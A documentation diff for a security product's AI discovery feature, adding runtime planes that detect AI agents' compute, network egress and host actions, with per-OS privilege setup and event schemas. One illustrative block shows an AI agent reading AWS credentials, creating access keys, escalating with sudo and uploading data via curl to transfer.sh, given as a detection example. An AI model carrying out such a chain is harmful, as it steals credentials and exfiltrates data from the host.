@@ -1,6 +1,6 @@
 ---
 title: AI Discovery
-description: Find AI agents, installed local models, running model servers, MCP servers, skills, and providers on the host. DefenseClaw runs a continuous fingerprinting scanner in the gateway and ships defenseclaw agent discover for an instant connector inventory.
+description: Find AI agents, installed local models, running model servers, MCP servers, skills, and providers on the host, and see which of them actually ran. DefenseClaw runs a continuous fingerprinting scanner and three runtime detection planes in the gateway, plus defenseclaw agent discover for an instant connector inventory.
 keywords:
   - DefenseClaw AI discovery
   - defenseclaw agent discover
@@ -10,6 +10,9 @@ keywords:
   - AI bill of materials
   - ai_discovery event
   - defenseclaw aibom
+  - AI discovery runtime planes
+  - shadow AI egress
+  - agent kill chain
 ---
 
 Most security teams find that the first useful question DefenseClaw answers isn't "did you block X?" — it's *"what AI is installed or running on this machine?"* AI Discovery is the four-surface inventory pipeline that answers it.
@@ -29,9 +32,10 @@ The TUI's `AI Discovery` view (above) is the operator-facing rendering of the sa
   <Card title="On-demand discovery" description="defenseclaw agent discover. Operator-side path scan that lists every connector and its install state." />
   <Card title="AIBOM" description="defenseclaw aibom scan. Connector inventory of skills, plugins, MCP servers, agents, tools, models, memory." />
   <Card title="Registry" description="defenseclaw registry. Catalog-based admission for skills and MCP servers from corporate, smithery, git, or Clawhub manifests." />
+  <Card title="Runtime planes" description="defenseclaw agent discovery runtime. Three in-gateway planes that observe what actually ran: inference compute, per-process egress, and agent actions." />
 </Cards>
 
-The four are independent — you can run any subset. Most teams start with `defenseclaw agent discover` to see what's there, then turn on continuous discovery in the gateway, then add AIBOM for compliance evidence.
+The five are independent — you can run any subset. Most teams start with `defenseclaw agent discover` to see what's there, then turn on continuous discovery in the gateway, then add AIBOM for compliance evidence, then enable the runtime planes to find out which of the inventory was ever actually used.
 
 ## Run it now: 30-second tour
 
@@ -550,10 +554,423 @@ On macOS, enhanced discovery respects the operating system's Transparency, Conse
 
 The local `GET /api/v1/ai-usage` response—and therefore `defenseclaw agent usage`—retains the dedicated `model` block so the operator can see what is installed or loaded. Local scan history retains the same block in `inventory.db`. Outbound canonical records follow each v8 destination's field-class redaction profile. Normal discovery sanitization omits extended model metadata plus model basenames/path hashes, and lifecycle correlation uses an installation-scoped HMAC pseudonym rather than a dictionary-testable model ID. Raw filesystem paths require both `ai_discovery.store_raw_local_paths: true` and a selected projection that preserves the `path` field class. The retired v7 `privacy.disable_redaction` control is not a runtime bypass.
 
+## Runtime planes: what actually ran
+
+Everything above establishes **presence and identity**. It deliberately does
+not prove that a detected component is active — an inventory that quietly
+implied liveness would be the more dangerous product.
+
+The runtime planes answer the next question. Which process, at this moment, is
+sustaining inference-level compute or sending data to which provider, and does
+a sequence of host actions add up to a chain?
+
+| Question | Answered by |
+| --- | --- |
+| What AI is **present**? | Discovery / AIBOM |
+| What AI is **allowed**? | [Registry](/docs/setup/registries) |
+| What AI **actually ran, and where did it send data**? | Runtime planes |
+
+Neither half produces the interesting pair alone. *Present but never running*
+is dormant attack surface only discovery sees. *Running and egressing but not
+present* is an agent that arrived by a path the inventory does not cover, and
+only the runtime planes see that.
+
+```bash
+defenseclaw agent discovery runtime enable --restart
+defenseclaw agent discovery runtime selftest
+defenseclaw agent discovery runtime findings
+```
+
+### The three planes
+
+| Plane | Observes | Mechanism |
+| --- | --- | --- |
+| **A** — inference heartbeat | Sustained CPU in a scriptable runtime, and resident memory large enough to hold model weights | `/proc` on Linux, `ps` on macOS, Toolhelp32 + `GetProcessTimes` on Windows |
+| **B** — shadow egress | **Per-process** socket attribution to a provider, and the DNS answers that name the peer | `/proc/net` + `/proc/<pid>/fd`, `lsof`, `GetExtendedTcpTable` |
+| **C** — agent actions | Kernel process, file, and identity events, gated on AI-agent process lineage | Endpoint Security (`eslogger`), `cn_proc` + `fanotify`, the Windows Security event log |
+
+Plane A only raises a heartbeat inside a scriptable runtime or a known model
+server. A compiled application burning CPU is a compiled application burning
+CPU, and scoring every busy process would make the signal worthless.
+
+Plane B reads **argv**, which the inventory scanner deliberately does not
+collect. That is the whole reason it exists as a separate surface: the
+inventory's process detector matches executable basenames, so an agent
+framework running inside a bare `python3` is invisible to it.
+
+<Callout type="warning" title="The runtime planes read more than the inventory does">
+argv is collected, and it is classified as **content** on the wire — each
+destination's [redaction profile](/docs/reference/redaction) governs whether it
+leaves the host. Provider hostnames are content for the same reason.
+Environment variable *values* are never read on any runtime path, matching the
+inventory scanner's names-only rule. DNS capture and the host plane each need
+their own explicit opt-in.
+</Callout>
+
+### What each platform actually delivers
+
+Plane C's coverage differs by platform and by privilege, and the sensor reports
+which parts it has rather than implying it has all of them.
+
+| Platform | Source | Needs | Delivers | Does not |
+| --- | --- | --- | --- | --- |
+| macOS | Endpoint Security via `eslogger` | root **and** Full Disk Access | all six kinds: exec with argv, exit, file read/write on watched paths, and account/privilege events recognised from the exec argument vector | — |
+| Linux | `cn_proc` netlink | nothing | exec, exit, uid/gid changes | — |
+| Linux | `fanotify` | `CAP_SYS_ADMIN` | file read/write on watched roots | — |
+| Windows | Security event log (`wevtapi`) | elevated token **and** Advanced Audit Policy | process creation and exit, account creation, group changes, privilege assignment | file events, which need a SACL per audited object |
+
+The Linux halves start independently. An unprivileged host gets `cn_proc` with
+the file half honestly reported absent, which beats losing the plane to one
+missing capability — and the snapshot reports it as *partially covered* rather
+than complete.
+
+Windows has two prerequisites that fail differently and are therefore reported
+differently: Advanced Audit Policy for the events at all, and the separate
+command-line policy for argv. Without the second, lineage still works and
+argument-vector tactics do not.
+
+```powershell
+# Windows, elevated: the events themselves
+auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
+auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
+auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
+
+# and, separately, argv on those events
+$audit = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit"
+New-Item -Path $audit -Force | Out-Null
+Set-ItemProperty -Path $audit -Name ProcessCreationIncludeCmdLine_Enabled -Value 1 -Type DWord
+```
+
+### What to grant, per OS
+
+Every plane runs without any of this and reports what it cannot see. Granting
+these is how coverage becomes complete, not how it starts — nothing here is a
+prerequisite for installing or running.
+
+Ask the host itself rather than reading a table:
+
+```bash
+defenseclaw agent discovery runtime permissions
+```
+
+It answers before anything is running, which is the point: `runtime selftest`
+can only explain a gateway that is already up. Add `--os linux|darwin|windows`
+to plan for a platform you are not standing on, or `--json` to feed a
+deployment tool.
+
+It can also apply what it finds missing:
+
+```bash
+defenseclaw agent discovery runtime permissions --grant
+```
+
+Every command is printed before anything runs, and the confirmation is not
+skippable without `--yes`. `--revert` undoes exactly what `--grant` applied.
+On Linux that is one `setcap` on the gateway binary; on Windows it is the
+three audit subcategories plus the command-line policy, which needs an
+already-elevated prompt. Nothing grants more than the requirement it names —
+notably there is no blanket SACL on Windows, because auditing every object on
+a filesystem to catch credential reads creates far more exposure than the
+detection is worth.
+
+macOS Full Disk Access is the one thing no amount of privilege can automate:
+TCC does not let any process grant it, to itself or anything else. The command
+opens the exact settings pane instead, which is the whole of what is
+achievable. Managed installs skip it via an MDM PPPC profile.
+
+It also checks. Each line reads `[granted]`, `[MISSING]`, or `[unknown]` for
+the host you are on, so the output is a list of gaps rather than a list of
+requirements. `[unknown]` means this process cannot verify that grant from
+where it is running — reported as such rather than as missing, because
+sending an operator to change something already correct is its own kind of
+wrong answer. Asking about another OS never probes: it would be a confident
+wrong answer about a machine you are not on.
+
+**Unmanaged install — the operator grants these directly**
+
+| | macOS | Linux | Windows |
+| --- | --- | --- | --- |
+| **A** inference heartbeat | nothing | nothing | nothing for own processes; elevation for all |
+| **B** egress attribution | root | root or `CAP_DAC_READ_SEARCH` | elevated token |
+| **B** DNS naming | root, for `/dev/bpf` | `CAP_NET_RAW` | elevated token |
+| **C** process + identity events | root **and** Full Disk Access | nothing | elevated **and** Advanced Audit Policy |
+| **C** file events | included above | `CAP_SYS_ADMIN` (fanotify) | a SACL per audited object |
+| **C** command lines | included above | included above | the separate command-line audit policy |
+
+Three of these are worth calling out because they are the ones that get
+missed:
+
+<Callout type="warn">
+**macOS Full Disk Access applies to the responsible process** — the terminal
+or daemon that launched the gateway, not the gateway binary. Without it,
+Endpoint Security refuses the client outright even when running as root, and
+Plane C reports itself stopped with Apple's own message.
+
+**Windows argv is a second policy.** The audit subcategories turn the events
+on; `ProcessCreationIncludeCmdLine_Enabled` turns on the argument vectors
+inside them. With only the first, lineage works and nearly every tactic
+silently does not.
+
+**Linux Plane C has two independent halves.** `cn_proc` needs nothing, so
+process events work unprivileged; `fanotify` needs `CAP_SYS_ADMIN`. The plane
+starts on whichever half it can and reports the other absent, rather than
+failing whole.
+</Callout>
+
+**Managed enterprise install — the installer arranges these**
+
+The gateway is deliberately de-privileged here, so with one exception these
+grants do not go to it:
+
+| | macOS | Linux | Windows |
+| --- | --- | --- | --- |
+| Gateway runs as | root (LaunchDaemon) | unprivileged `defenseclaw`, systemd sandbox | virtual service account |
+| Acquisition | direct | **brokered** via `defenseclaw-sensor-helper` | **brokered** via `defenseclaw-sensor-helper` |
+| Who holds the privilege | the gateway | the helper (root) | the helper |
+| Operator still grants | Full Disk Access, via an MDM PPPC profile | nothing — the unit declares its capabilities | Advanced Audit Policy and the command-line policy, via GPO |
+
+macOS is the exception: its managed gateway already runs as root for an
+unrelated reason, so there is nothing to broker and the only outstanding grant
+is the TCC profile. Linux and Windows de-privilege the gateway, so the helper
+holds the capabilities instead and the operator grants nothing at the gateway
+at all.
+
+### Where the privilege lives
+
+Plane C needs to read the kernel. The gateway is the component least entitled
+to: it is network-facing, so a managed deployment de-privileges it on purpose.
+On Linux it runs as an unprivileged account inside a systemd sandbox; on
+Windows it runs as a dedicated virtual service account. Only the managed macOS
+daemon runs as root, and for an unrelated reason — the cloud auth provider has
+to re-perm its per-machine credential store.
+
+Measured under the shipped Linux unit, a gateway reading directly sees
+**one process and zero connections**. `ProcSubset=pid` removes `/proc/net` and
+hides every other process before privilege is even considered,
+`RestrictAddressFamilies` blocks `AF_NETLINK` and `AF_PACKET`, and the empty
+`CapabilityBoundingSet` blocks `fanotify`.
+
+So acquisition is brokered instead. `defenseclaw-sensor-helper` holds the
+privilege, does nothing else, and answers a fixed set of questions:
+
+<Callout type="info">
+The helper takes **no instruction about what to read**. There is no path,
+filter, pid, glob, or command anywhere in a request — a test asserts the
+request type's field count so one cannot be added unnoticed. What it watches
+comes from its own root-owned configuration. A compromised gateway can
+therefore obtain the process table it would have had anyway, and cannot turn a
+root process into a general-purpose file reader.
+</Callout>
+
+| Setting | Value |
+| --- | --- |
+| `ai_discovery.runtime.acquisition` | `auto` (default), `direct`, or `helper` |
+| Transport | `AF_UNIX` socket, mode `0660`, owned by the gateway's group |
+| Peer check (Linux, macOS) | kernel-supplied uid via `SO_PEERCRED` / `LOCAL_PEERCRED`, which the peer cannot forge |
+| Peer check (Windows) | the socket DACL, refused in-kernel at open |
+| Helper network access | none — the unit allows `AF_UNIX`, `AF_NETLINK` and `AF_PACKET` only |
+
+`auto` brokers only where the gateway was de-privileged *and* a helper is
+therefore installed. It reads directly on a managed macOS host, because that
+gateway is already root and a broker would add a failure mode for nothing, and
+on an unmanaged workstation, where there is no helper to ask and the honest
+answer is to read what it can and report the shortfall.
+
+With the helper running, that same sandboxed Linux gateway reports
+`degraded: false` and detects a full credential-access → identity-creation →
+exfiltration chain, including file reads observed through `fanotify` — a
+syscall it cannot itself make.
+
+On Linux the helper is a systemd unit; on Windows it is an SCM service the
+enterprise installer registers alongside the gateway, which is ordered to
+start after it so the socket is listening before the planes look for it.
+
+```bash
+systemctl enable --now defenseclaw-sensor-helper
+```
+
+<Callout type="warn">
+The helper needs `CAP_CHOWN` alongside the capabilities acquisition uses. It
+hands the socket to the gateway's group, and without it the socket stays
+root-owned, the gateway cannot open it, and the helper would otherwise come up
+reporting success while brokering nothing. The listener verifies the ownership
+took and refuses to start rather than allow that.
+</Callout>
+
+### Naming a peer: DNS capture
+
+With `dns_capture` enabled, an egress peer is named from the answer this host
+actually resolved rather than inferred from its address. That is a direct
+observation, which is why it carries full confidence where a PTR record — owned
+by whoever controls the address, and frequently naming infrastructure rather
+than the service — does not.
+
+| Platform | Mechanism |
+| --- | --- |
+| Linux | `AF_PACKET` with a kernel BPF filter for UDP/53 |
+| macOS | `/dev/bpf` with the same filter, in immediate mode |
+| Windows | `Microsoft-Windows-DNS-Client/Operational` event 3008 |
+
+No `tcpdump` subprocess on any platform, and no third-party capture driver on
+Windows. A capture that cannot start is degraded coverage rather than fatal:
+the reverse resolver still names peers, less confidently, and the snapshot says
+so.
+
+### Every host-plane signal is gated on agent lineage
+
+Not one Plane C signal fires for a process without an AI agent above it in the
+process tree. A developer running `sudo` produces nothing; the same `sudo` as a
+descendant of `claude` produces a signal.
+
+That gate is the primary false-positive control, and it is measurable: every
+snapshot reports how many observations it classified and how many it discarded
+for having no agent above them. A control nobody can measure is a control
+nobody can trust — and a gated count rising while the classified count stays at
+zero is a different problem from a quiet host.
+
+These tactics are far too ordinary on a developer machine to be worth reporting
+without an actor attached:
+
+```
+claude ──▶ sh ──▶ cat ~/.aws/credentials          credential_access
+       ──▶ sh ──▶ aws iam create-access-key       identity_creation
+       ──▶ sh ──▶ sudo …                          privilege_escalation
+       ──▶ curl -T - https://transfer.sh/x        exfiltration
+```
+
+Not one of those steps is worth paging on alone, and four separate per-process
+findings would be four alerts nobody joins up. **The sequence is the finding**,
+so a host-plane finding is one per agent *session*, not one per process — an
+agent that is a shell script forks children that inherit its identity, and each
+one rooting itself would reproduce exactly the fragmentation this avoids.
+No single host-plane tactic reaches `high` on its own; the chain bonus is
+awarded only when the session moved through three or more stages *in order*.
+An agent that reads a credential and later uploads something has progressed;
+one that uploads something and much later reads a config file has not.
+
+### Correlation with the inventory
+
+Runtime observations are joined against the discovery snapshot in process, so a
+finding reports whether the inventory can account for it:
+
+| Verdict | Meaning | Effect on the score |
+| --- | --- | --- |
+| `accounted` | Discovery independently observed the same subject | Local-inference weights are **halved** — still inventory, no longer something to chase |
+| `unaccounted` | A **complete** scan explains none of this | **Escalates**: sustained inference the filesystem walk cannot explain means the weights are not where a scanner can see them |
+| `unobserved` | There was no usable inventory to consult | **Nothing.** Neither attenuation nor escalation |
+
+That last row is the rule the design rests on: **unobserved is never spent as
+evidence or as exoneration.** A detector whose numbers fall because another
+subsystem crashed is reporting "quiet" for "blind". The blindness is still
+recorded, because not scoring on it is not the same as not saying so.
+
+Attenuation touches only local-inference signals. An inventoried model file on
+disk says nothing about where a process sent its requests, so it never
+discounts egress evidence.
+
+### Coverage is reported, never implied
+
+A detector reporting clean because it was never able to look is
+indistinguishable, on a dashboard, from a host that is genuinely clean. So
+every surface states what it could not see:
+
+```bash
+defenseclaw agent discovery runtime selftest
+```
+
+```
+  ✓ inference heartbeat: running via /proc
+  ✓ shadow egress: running via /proc/net and /proc/<pid>/fd
+  ✓ agent actions: running via netlink process connector (cn_proc) only
+  processes: 180 read, 0 not fully readable | connections: 14 seen, 9 with no owner
+  ⚠ coverage is partial:
+    - agent actions partially covered: file events need fanotify, which needs
+      CAP_SYS_ADMIN: fanotify_init: operation not permitted
+    - 64% of connections could not be attributed to a process. Run the gateway
+      with elevated privilege for machine-wide egress attribution.
+```
+
+The privilege asymmetry behind that last line is real. On macOS and Linux the
+whole process table is readable unprivileged, but the socket-to-pid mapping is
+readable only for the caller's own processes — so an unprivileged run watches
+the whole machine *compute* and only its own share of it *talk*. Windows is the
+exception: its connection table carries the owning pid in every row.
+
+Note that Plane C is *running* here and still incomplete. Partial coverage is
+reported as partial rather than as either healthy or down, because a plane
+delivering process events but not file events is missing a whole tactic class,
+and calling that complete would let an operator read reduced coverage as a
+clean host.
+
+Plane health is emitted on **every** cycle, including when a plane is down. If
+health were reported only while a plane worked, a subscription that died would
+leave no trace, and absence is the hardest thing to alert on.
+
+### Tunable knobs
+
+| Knob | Purpose |
+| --- | --- |
+| `--poll-interval-s` | Seconds between polls (5–3600). Also the window that distinguishes sustained inference from a momentary CPU spike. |
+| `--min-risk-to-report` | Reporting floor (1–100). Defaults to 30, the medium band. |
+| `--enable-host-plane` | Explicit opt-in for Plane C. Listing `c` in `planes` without this is ignored. |
+| `--dns-capture` | Name peers from the answer the process received rather than inferring from an address. Needs elevated privilege. |
+
+Two knobs are config-only, because neither belongs in a one-shot command:
+
+```yaml
+ai_discovery:
+  runtime:
+    enabled: true
+    planes: [a, b, c]
+    enable_host_plane: true
+    chain_window_min: 60          # how long a session stays open for a chain
+    sanctioned_endpoints:         # egress here is expected, not a finding
+      - api.corp.example.com
+```
+
+`chain_window_min` is the window over which stages accumulate into a kill
+chain. Too short and a patient agent never chains; too long and unrelated
+activity in the same session joins up. `sanctioned_endpoints` is where an
+environment states its own approved providers — matching egress still appears
+in the plane's output, it just stops being scored as unsanctioned.
+
+`ai_discovery.runtime.correlate` defaults on. Setting it to `false` removes the
+inventory read entirely; it does **not** make findings score as though the
+inventory disagreed.
+
+### Where the data lands
+
+Three canonical v8 log families under the existing `ai.discovery` bucket, so
+presence and behaviour share one bucket, one destination policy, and one set of
+dashboards:
+
+| Event | Carries |
+| --- | --- |
+| `ai.runtime.finding` | One scored finding, its evidence trail, and the inventory verdict |
+| `ai.runtime.activity` | One host-plane tactic, with its MITRE ATT&CK technique and chain stage |
+| `ai.runtime.plane_health` | One plane's state — emitted every cycle, including zero |
+
+A degraded cycle is reported with outcome `partial` rather than `completed`.
+
+The local observability stack ships `defenseclaw-ai-runtime.json`, provisioned
+by `defenseclaw setup local-observability up` like every other dashboard and
+cross-linked with AI Discovery. Splunk local mode gets a matching **AI Discovery
+Runtime Planes** view. Both put coverage in the first row, before any finding.
+
+### TUI and macOS app
+
+The TUI `Runtime` panel (`N`) and the macOS app's **Runtime** panel render the
+same snapshot. The plane strip is always
+visible — press `p` to expand each plane's reason — and coverage sits in the
+header beside the finding count, because a reader who sees only the count
+cannot tell a quiet host from a blind sensor. `Enter` opens a finding, which
+renders a kill chain as a sequence rather than a set, and always states the
+inventory verdict including `unobserved`.
+
 ## Use it alongside Registry
 
 Discovery tells you *what's there*. The [Registry](/docs/setup/registries)
-tells you *what's allowed*.
+tells you *what's allowed*. The runtime planes tell you *what actually ran*.
 
 A common production pattern:
 
@@ -602,3 +1019,4 @@ A common production pattern:
 - [Capability Matrix](/docs/capability-matrix) — what hooks each discovered connector exposes
 - [Setup → Skill Scanner](/docs/setup/skill-scanner) and [MCP Scanner](/docs/setup/mcp-scanner) — what to do *with* discovered skills and MCP servers
 - [Reference → CLI](/docs/reference/cli) — full flag surface for `agent`, `aibom`, `registry`
+- [Reference → Redaction](/docs/reference/redaction) — which field classes govern argv and provider hostnames
